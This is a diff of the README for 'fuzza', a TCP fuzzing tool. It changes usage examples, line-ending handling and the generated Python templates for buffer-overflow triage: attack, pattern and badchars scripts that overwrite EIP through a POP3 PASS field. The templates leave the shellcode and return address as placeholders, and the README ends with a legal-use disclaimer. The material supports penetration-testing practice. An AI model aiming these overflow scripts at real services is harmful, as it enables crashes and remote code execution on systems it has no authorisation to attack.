@@ -9,6 +9,8 @@
 [![PyPI - License](https://img.shields.io/pypi/l/fuzza)](https://pypi.org/project/fuzza/)
 
 [![Build Status](https://github.com/cytopia/fuzza/workflows/linting/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=linting)
+[![Build Status](https://github.com/cytopia/fuzza/workflows/testing/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=testing)
+[![Build Status](https://github.com/cytopia/fuzza/workflows/building/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=building)
 
 Customizable TCP fuzzing tool to test for remote buffer overflows.
 
@@ -16,6 +18,14 @@ Customizable TCP fuzzing tool to test for remote buffer overflows.
 sending any post commands after the payload has been sent. In order to replicate and triage the
 buffer overflow, `fuzza` can be used to generate custom python scripts for attack, badchars and
 finding the eip based on your command line arguments. See examples for more details.
+
+
+## Features
+
+* Works similar to [generic_send_tcp](https://www.codeproject.com/articles/19307/generic-tcp-ip-client-server), but instructions are specified via command line arguments
+* Has an [expect](https://linux.die.net/man/1/expect)-like feature to wait for a specific response which also supports regex
+* Generates custom Python scripts based on your command line arguments to triage the overflow
+* Works with Python2 and Python3
 
 
 ## Installation
@@ -72,7 +82,6 @@ optional arguments:
                         which there will not be an answer. Multiple <send>:<expect> are supported
                         and must be separated by a comma.
                         Regex supported for <expect> part.
-  -C, --crlf            Send CRLF as line-endings (default: LF)
   -t float, --timeout float
                         Timeout in sec for receiving data before declaring the endpoint as crashed.
                         Default: 30.0
@@ -98,7 +107,7 @@ example:
      1. Expect any response from password payload
      2. Terminate the connection via QUIT
      3. Do not expect a follow up response
-  $ fuzza -i ':.*POP3.*,USER bob:.*welcome.*' -e ':.*,QUIT:' -p 'PASS '
+  $ fuzza -i ':.*POP3.*,USER bob\r\n:.*welcome.*' -e ':.*,QUIT:' -p 'PASS ' -s '\r\n'
 
 Visit https://github.com/cytopia/fuzza for more examples.
 ```
@@ -119,7 +128,7 @@ $ fuzza host.example.tld 4444
 The following example connects to an IMAP service, waits for its banner and tries to overflow
 the password value of `a LOGIN <user> <pass>`:
 ```bash
-$ fuzza -i ':.*' -p 'a LOGIN bob ' host.example.tld 143
+$ fuzza -i ':.*' -p 'a LOGIN bob ' -s '\r\n' host.example.tld 143
 ```
 
 ### Generate
@@ -150,11 +159,19 @@ from __future__ import print_function
 import socket
 
 def str2b(data):
-    """Python2/3 compat."""
+    """Unescape P2/P3 and convert to bytes if Python3."""
+    # Python2: Unescape control chars
     try:
-        return data.encode('latin1')
+        return data.decode('string_escape')
+    except AttributeError:
+        pass
     except UnicodeDecodeError:
-        return data
+        pass
+    # Python3: Unescape control chars and convert to byte
+    try:
+        return data.encode("utf-8").decode('unicode-escape').encode("latin1")
+    except UnicodeDecodeError:
+        pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -168,7 +185,7 @@ pattern = (
 print('Trying to send %s bytes unique chars...' % (str(len(pattern))))
 try:
     s.connect(('host.example.tld', 4444))
-    s.send(str2b('' + pattern + '' + '\n'))
+    s.send(str2b('' + pattern + ''))
     print('done')
 except:
     print('Could not connect')
@@ -194,11 +211,19 @@ from __future__ import print_function
 import socket
 
 def str2b(data):
-    """Python2/3 compat."""
+    """Unescape P2/P3 and convert to bytes if Python3."""
+    # Python2: Unescape control chars
     try:
-        return data.encode('latin1')
+        return data.decode('string_escape')
+    except AttributeError:
+        pass
     except UnicodeDecodeError:
-        return data
+        pass
+    # Python3: Unescape control chars and convert to byte
+    try:
+        return data.encode("utf-8").decode('unicode-escape').encode("latin1")
+    except UnicodeDecodeError:
+        pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -228,7 +253,7 @@ buffer = "A"*len_overflow + eip + badchars
 print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
     s.connect(('host.example.tld', 4444))
-    s.send(str2b('' + buffer + '' + '\n'))
+    s.send(str2b('' + buffer + ''))
     print('done')
 except:
     print('Could not connect')
@@ -255,11 +280,19 @@ from __future__ import print_function
 import socket
 
 def str2b(data):
-    """Python2/3 compat."""
+    """Unescape P2/P3 and convert to bytes if Python3."""
+    # Python2: Unescape control chars
     try:
-        return data.encode('latin1')
+        return data.decode('string_escape')
+    except AttributeError:
+        pass
     except UnicodeDecodeError:
-        return data
+        pass
+    # Python3: Unescape control chars and convert to byte
+    try:
+        return data.encode("utf-8").decode('unicode-escape').encode("latin1")
+    except UnicodeDecodeError:
+        pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -275,7 +308,7 @@ buffer  = "A"*len_overflow + eip + "\x90"*len_nop_sled + shellcode + padding
 print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
     s.connect(('host.example.tld', 4444))
-    s.send(str2b('' + buffer + '' + '\n'))
+    s.send(str2b('' + buffer + ''))
     print('done')
 except:
     print('Could not connect')
@@ -309,32 +342,32 @@ this can be achieved with the `-i` argument to specify initial data to be send a
 Additionally we also want to close the connection after sending the payload (if possible).
 This can be achieved with the `-e` option which works exactly as `-i`.
 ```bash
-$ fuzza -i ':.*OK POP3.*,USER test:.*test welcome.*' -p 'PASS ' -e ':.*,QUIT:' mail.example.tld 110
+$ fuzza -i ':.*OK POP3.*,USER test\r\n:.*test welcome.*' -p 'PASS ' -s '\r\n' -e ':.*,QUIT\r\n:' mail.example.tld 110
 
 ------------------------------------------------------------
 A * 100
 ------------------------------------------------------------
-Init Awaiting: .*OK POP3.*
-Init Received: +OK POP3 server mail.example.tld ready <00005.544236132@mail.example.tld>
-Init Sending:  USER test
-Init Awaiting: test welcome
-Init Received: +OK test welcome here
-Sending "PASS " + "A"*100 + ""
-Exit Awaiting: .*
-Exit Received: -ERR unable to lock mailbox
-Exit Sending:  QUIT
+Init Awaiting:   ".*OK POP3.*"
+Init Received:   "+OK POP3 server mail.example.tld ready <00005.544236132@mail.example.tld>"
+Init Sending:    "USER test\r\n"
+Init Awaiting:   "test welcome"
+Init Received:   "+OK test welcome here"
+Sending Payload: "PASS " + "A"*100 + "\r\n"
+Exit Awaiting:   ".*"
+Exit Received:   "-ERR unable to lock mailbox"
+Exit Sending:    "QUIT\r\n"
 ...
 
 ------------------------------------------------------------
 A * 2700
 ------------------------------------------------------------
-Init Awaiting: .*POP3.*
-Init Received: +OK POP3 server mail.example.tld ready <00009.592913389@mail.example.tld>
-Init Sending:  USER test
-Init Awaiting: welcome here
-Init Received: +OK test welcome here
-Sending "PASS " + "A"*2700 + ""
-Exit Awaiting: .*
+Init Awaiting:   ".*OK POP3.*"
+Init Received:   "+OK POP3 server mail.example.tld ready <00005.544236132@mail.example.tld>"
+Init Sending:    "USER test\r\n"
+Init Awaiting:   "test welcome"
+Init Received:   "+OK test welcome here"
+Sending Payload: "PASS " + "A"*2700 + "\r\n"
+Exit Awaiting:   ".*"
 
 Remote service (most likely) crashed at 2700 bytes of "A"
 Payload sent:
@@ -350,7 +383,7 @@ automatically generate triaging scripts based on your current arguments and find
 Use the same arguments as before, add the initial length of 2700 bytes (`-l 2700`) and specify
 an output directory (`-g <path>`):
 ```bash
-$ fuzza -i ':.*OK POP3.*,USER test:.*test welcome.*' -p 'PASS ' -e ':.*,QUIT:' -l 2700 -g out/ mail.example.tld 110
+$ fuzza -i ':.*OK POP3.*,USER test\r\n:.*test welcome.*' -p 'PASS ' -s '\r\n' -e ':.*,QUIT\r\n:' -l 2700 -g out/ mail.example.tld 110
 ```
 `fuzza` will then generate three files in `out/` directory based on your command line arguments:
 
@@ -369,17 +402,25 @@ from __future__ import print_function
 import socket
 
 def str2b(data):
-    """Python2/3 compat."""
+    """Unescape P2/P3 and convert to bytes if Python3."""
+    # Python2: Unescape control chars
     try:
-        return data.encode('latin1')
+        return data.decode('string_escape')
+    except AttributeError:
+        pass
     except UnicodeDecodeError:
-        return data
+        pass
+    # Python3: Unescape control chars and convert to byte
+    try:
+        return data.encode("utf-8").decode('unicode-escape').encode("latin1")
+    except UnicodeDecodeError:
+        pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 len_total    = 2700                # Start at len_overflow and try out how much can be overwritten
-len_overflow = 2670                # Use pattern_create.rb and pattern_offset.rb to find exact offset
-len_nop_sled = 16                  # Add nops if you need to encode your shellcode
+len_overflow = 2696                # Use pattern_create.rb and pattern_offset.rb to find exact offset
+len_nop_sled = 0                   # Add x bytes of nops before shellcode for shellcode decoding
 eip          = "\x42\x42\x42\x42"  # Change this (Keep in mind to put address in reverse order)
 shellcode    = ""
 
@@ -390,14 +431,15 @@ print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
     s.connect(('mail.example.tld', 110))
     s.recv(1024)
-    s.send(str2b('USER test' + '\r\n'))
+    s.send(str2b('USER test\r\n'))
     s.recv(1024)
-    s.send(str2b('PASS ' + buffer + '' + '\r\n'))
+    s.send(str2b('PASS ' + buffer + '\r\n'))
     s.recv(1024)
-    s.send(str2b('QUIT' + '\r\n'))
+    s.send(str2b('QUIT\r\n'))
     print('done')
 except:
     print('Could not connect')
+s.close()
 ```
 
 **`pattern.py`**
@@ -409,11 +451,19 @@ from __future__ import print_function
 import socket
 
 def str2b(data):
-    """Python2/3 compat."""
+    """Unescape P2/P3 and convert to bytes if Python3."""
+    # Python2: Unescape control chars
     try:
-        return data.encode('latin1')
+        return data.decode('string_escape')
+    except AttributeError:
+        pass
     except UnicodeDecodeError:
-        return data
+        pass
+    # Python3: Unescape control chars and convert to byte
+    try:
+        return data.encode("utf-8").decode('unicode-escape').encode("latin1")
+    except UnicodeDecodeError:
+        pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -454,14 +504,15 @@ print('Trying to send %s bytes unique chars...' % (str(len(pattern))))
 try:
     s.connect(('mail.example.tld', 110))
     s.recv(1024)
-    s.send(str2b('USER test' + '\r\n'))
+    s.send(str2b('USER test\r\n'))
     s.recv(1024)
-    s.send(str2b('PASS ' + pattern + '' + '\r\n'))
+    s.send(str2b('PASS ' + pattern + '\r\n'))
     s.recv(1024)
-    s.send(str2b('QUIT' + '\r\n'))
+    s.send(str2b('QUIT\r\n'))
     print('done')
 except:
     print('Could not connect')
+s.close()
 ```
 
 **`badchars.py`**
@@ -473,11 +524,19 @@ from __future__ import print_function
 import socket
 
 def str2b(data):
-    """Python2/3 compat."""
+    """Unescape P2/P3 and convert to bytes if Python3."""
+    # Python2: Unescape control chars
     try:
-        return data.encode('latin1')
+        return data.decode('string_escape')
+    except AttributeError:
+        pass
     except UnicodeDecodeError:
-        return data
+        pass
+    # Python3: Unescape control chars and convert to byte
+    try:
+        return data.encode("utf-8").decode('unicode-escape').encode("latin1")
+    except UnicodeDecodeError:
+        pass
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -508,15 +567,21 @@ print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
     s.connect(('mail.example.tld', 110))
     s.recv(1024)
-    s.send(str2b('USER test' + '\r\n'))
+    s.send(str2b('USER test\r\n'))
     s.recv(1024)
-    s.send(str2b('PASS ' + buffer + '' + '\r\n'))
+    s.send(str2b('PASS ' + buffer + '\r\n'))
     s.recv(1024)
-    s.send(str2b('QUIT' + '\r\n'))
+    s.send(str2b('QUIT\r\n'))
     print('done')
 except:
     print('Could not connect')
+s.close()
 ```
+
+
+## Disclaimer
+
+This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.
 
 
 ## License
